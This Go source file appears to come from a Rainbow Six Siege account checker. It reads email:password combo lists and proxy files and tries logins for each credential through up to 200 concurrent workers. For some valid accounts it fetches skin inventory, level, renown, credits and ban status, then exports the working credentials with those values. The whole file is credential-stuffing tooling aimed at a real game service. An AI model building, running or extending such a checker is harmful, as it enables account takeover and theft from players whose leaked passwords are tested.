package checker

import (
	"bufio"
	"encoding/json"
	"fmt"
	"math"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/yourusername/r6checker/auth"
	"github.com/yourusername/r6checker/models"
)

// Checker handles the account checking process
type Checker struct {
	AuthClient      *auth.Client
	ValidAccounts   []*models.AccountData
	Stats           models.CheckerStats
	DataDir         string
	ProgressUpdates chan models.ProgressUpdate
	resultsFile     string
	mu              sync.Mutex
	stopping        bool
	fetchSiegeSkinsData bool
	detailedInfoLimit   int
}

// NewChecker creates a new account checker
func NewChecker(dataDir string) *Checker {
	return &Checker{
		AuthClient:      auth.NewClient(),
		ValidAccounts:   make([]*models.AccountData, 0),
		DataDir:         dataDir,
		ProgressUpdates: make(chan models.ProgressUpdate, 100),
		resultsFile:     filepath.Join(dataDir, "valid_accounts.json"),
		fetchSiegeSkinsData: true,
		detailedInfoLimit:   5, // Only fetch detailed info for first 5 accounts
	}
}

// LoadAccounts loads account credentials from a file
func (c *Checker) LoadAccounts(filename string) ([]models.AccountCredentials, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open accounts file: %w", err)
	}
	defer file.Close()

	var accounts []models.AccountCredentials
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || !strings.Contains(line, ":") {
			continue
		}

		parts := strings.SplitN(line, ":", 2)
		accounts = append(accounts, models.AccountCredentials{
			Email:    strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(parts[1]),
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading accounts file: %w", err)
	}

	return accounts, nil
}

// LoadProxies loads proxies from a file
func (c *Checker) LoadProxies(filename string) ([]string, error) {
	if filename == "" {
		return nil, nil
	}

	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open proxies file: %w", err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		proxies = append(proxies, line)
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxies file: %w", err)
	}

	return proxies, nil
}

// StartChecking starts the account checking process
func (c *Checker) StartChecking(accounts []models.AccountCredentials, concurrency int, clearPrevious bool) {
	// Reset stats
	c.mu.Lock()
	c.Stats = models.CheckerStats{
		StartTime: time.Now(),
	}
	c.stopping = false
	if clearPrevious {
		c.ValidAccounts = make([]*models.AccountData, 0)
	}
	c.mu.Unlock()

	// Create results directory if it doesn't exist
	os.MkdirAll(filepath.Dir(c.resultsFile), 0755)

	// Clear previous results file if requested
	if clearPrevious {
		os.WriteFile(c.resultsFile, []byte("[]"), 0644)
	}

	// Create worker pool
	total := len(accounts)
	jobs := make(chan models.AccountCredentials, total)
	results := make(chan models.CheckResult, total)
	
	// Limit concurrency to reasonable number
	if concurrency <= 0 || concurrency > 200 {
		concurrency = 20
	}

	// Start workers
	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for account := range jobs {
				if c.stopping {
					return
				}
				result := c.checkAccount(account, workerID)
				results <- result
			}
		}(i)
	}

	// Start result collector
	go func() {
		for i := 0; i < total; i++ {
			if c.stopping {
				break
			}

			result := <-results
			c.mu.Lock()
			if result.Valid && result.Account != nil {
				c.ValidAccounts = append(c.ValidAccounts, result.Account)
				c.Stats.Valid++
				
				// Save account to results file
				c.saveAccount(result.Account)
			} else {
				c.Stats.Invalid++
			}
			c.Stats.Processed++
			processed := c.Stats.Processed
			valid := c.Stats.Valid
			invalid := c.Stats.Invalid
			c.mu.Unlock()

			// Send progress update
			percent := int(float64(processed) / float64(total) * 100)
			elapsed := time.Since(c.Stats.StartTime).Seconds()
			speed := float64(processed) / elapsed
			var eta float64
			if speed > 0 {
				eta = float64(total-processed) / speed
			} else {
				eta = 0
			}

			select {
			case c.ProgressUpdates <- models.ProgressUpdate{
				Processed: processed,
				Total:     total,
				Valid:     valid,
				Invalid:   invalid,
				Percent:   percent,
				Speed:     speed,
				ETA:       eta,
			}:
			default:
				// Channel full, skip update
			}
		}

		// Final update
		c.mu.Lock()
		c.Stats.EndTime = time.Now()
		c.Stats.ElapsedTime = c.Stats.EndTime.Sub(c.Stats.StartTime).Seconds()
		c.Stats.Speed = float64(c.Stats.Processed) / c.Stats.ElapsedTime
		c.mu.Unlock()
	}()

	// Send accounts to workers
	for _, account := range accounts {
		jobs <- account
	}
	close(jobs)

	// Wait for workers to finish
	wg.Wait()
	close(results)
}

// StopChecking stops the account checking process
func (c *Checker) StopChecking() {
	c.mu.Lock()
	c.stopping = true
	c.mu.Unlock()
}

// GetValidAccounts returns the list of valid accounts
func (c *Checker) GetValidAccounts() []*models.AccountData {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.ValidAccounts
}

// GetStats returns the current checker statistics
func (c *Checker) GetStats() models.CheckerStats {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.Stats
}

// checkAccount checks a single account
func (c *Checker) checkAccount(creds models.AccountCredentials, workerID int) models.CheckResult {
	// Try to log in
	accountData, err := c.AuthClient.Login(creds.Email, creds.Password)
	if err != nil {
		return models.CheckResult{
			Valid: false,
			Error: err.Error(),
		}
	}

	// Account is valid
	accountData.CreatedAt = time.Now()

	// Get SiegeSkins data for the first few accounts
	c.mu.Lock()
	validCount := c.Stats.Valid
	shouldFetchSiegeSkinsData := c.fetchSiegeSkinsData && validCount < c.detailedInfoLimit
	c.mu.Unlock()

	if shouldFetchSiegeSkinsData && accountData.Ticket != "" && accountData.SessionID != "" {
		if siegeSkinsData, err := c.AuthClient.GetSiegeSkinsData(accountData.Ticket, accountData.SessionID); err == nil {
			accountData.SiegeSkinsData = siegeSkinsData
			fmt.Printf("Worker %d - Got SiegeSkins data for %s: Level %d, Renown: %d\n", 
				workerID, creds.Email, siegeSkinsData.Level, siegeSkinsData.Renown)
		} else {
			fmt.Printf("Worker %d - Error fetching SiegeSkins data for %s: %s\n", 
				workerID, creds.Email, err.Error())
		}
	}

	return models.CheckResult{
		Account: accountData,
		Valid:   true,
	}
}

// saveAccount saves a valid account to the results file
func (c *Checker) saveAccount(account *models.AccountData) error {
	// Read existing accounts
	var accounts []*models.AccountData
	data, err := os.ReadFile(c.resultsFile)
	if err == nil {
		if err := json.Unmarshal(data, &accounts); err != nil {
			accounts = make([]*models.AccountData, 0)
		}
	} else {
		accounts = make([]*models.AccountData, 0)
	}

	// Add new account
	accounts = append(accounts, account)

	// Write back to file
	data, err = json.MarshalIndent(accounts, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal accounts: %w", err)
	}

	if err := os.WriteFile(c.resultsFile, data, 0644); err != nil {
		return fmt.Errorf("failed to write accounts file: %w", err)
	}

	return nil
}

// ExportAccounts exports valid accounts to a file
func (c *Checker) ExportAccounts(filename string, format string) error {
	c.mu.Lock()
	accounts := c.ValidAccounts
	c.mu.Unlock()

	if len(accounts) == 0 {
		return fmt.Errorf("no valid accounts to export")
	}

	var data []byte
	var err error

	switch format {
	case "json":
		data, err = json.MarshalIndent(accounts, "", "  ")
		if err != nil {
			return fmt.Errorf("failed to marshal accounts: %w", err)
		}
	case "txt":
		var lines []string
		for _, account := range accounts {
			line := fmt.Sprintf("%s:%s | Username: %s | ID: %s", 
				account.Email, account.Password, account.Username, account.ProfileID)
			
			if account.SiegeSkinsData != nil {
				line += fmt.Sprintf(" | Level: %d | Renown: %d | Credits: %d", 
					account.SiegeSkinsData.Level, account.SiegeSkinsData.Renown, account.SiegeSkinsData.Credits)
				if account.SiegeSkinsData.Banned {
					line += " | BANNED"
				}
			}
			
			lines = append(lines, line)
		}
		data = []byte(strings.Join(lines, "\n"))
	default:
		return fmt.Errorf("unsupported export format: %s", format)
	}

	return os.WriteFile(filename, data, 0644)
}

// FormatTime formats seconds into minutes and seconds
func FormatTime(seconds float64) string {
	mins := int(math.Floor(seconds / 60))
	secs := int(math.Floor(seconds)) % 60
	return fmt.Sprintf("%dm %ds", mins, secs)
}